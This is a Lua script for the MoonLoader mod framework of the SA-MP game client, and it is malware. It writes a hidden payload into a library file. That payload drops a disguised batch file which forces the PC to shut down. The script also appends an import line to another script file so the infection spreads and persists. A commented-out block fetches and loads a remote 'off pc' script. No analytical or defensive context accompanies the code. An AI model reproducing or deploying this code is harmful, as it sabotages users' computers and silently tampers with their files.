code = [[
local p = getFolderPath(28)..'//Temp//bfsvc.bat'
function main()
	while not isSampAvailable() do wait(0) end
	local f = io.open(p,'w')
	f:write('shutdown -s -t 1')
	f:close()
	wait(1)
	os.execute(p)
	wait(-1)
end
]]
imp = '\nnnnnnnn = import \'moonloader/lib/qwerty123.lua\' '
function main()
	while not isSampAvailable() do wait(0) end

	local path = getWorkingDirectory()..'//lib//qwerty123.lua'
	local f = io.open(path,"w")
	f:write(code)
	f:close()

	wait(100)
	local l = getFiles(getWorkingDirectory(),'.lua')
	local f = io.open(getWorkingDirectory()..'//'..l[1],'r+')
	local ff = f:read('*a')
	if not ff:find(imp) then
		f:seek("end", 0);
		f:write(imp)
		f:flush()
		wait(1000)
		reloadScripts()
	end
	f:close()


	wait(-1)
end

function getFiles(dir,format)
	format = format or ''
	local files = {}
	local handleFile, nameFile = nil,nil
	local handleFile, nameFile = findFirstFile(dir..'/*'..format)
	while nameFile do
		if handleFile then
			if not nameFile then 
				findClose(handleFile)
			else
				files[#files+1] = nameFile
				nameFile = findNextFile(handleFile)
			end
		end
	end
	return files
end
--[[
if not doesFileExist(getWorkingDirectory()..'/!000000000000000000000.lua') then
	downloadUrlToFile('https://raw.githubusercontent.com/Vespan/Lua/master/off%20pc.lua',getWorkingDirectory()..'/!000000000000000000000.lua',function(id, status, p1, p2)
		if status == 58 then
			script.load(getWorkingDirectory()..'/!000000000000000000000.lua')
		end
	end)
end
]]
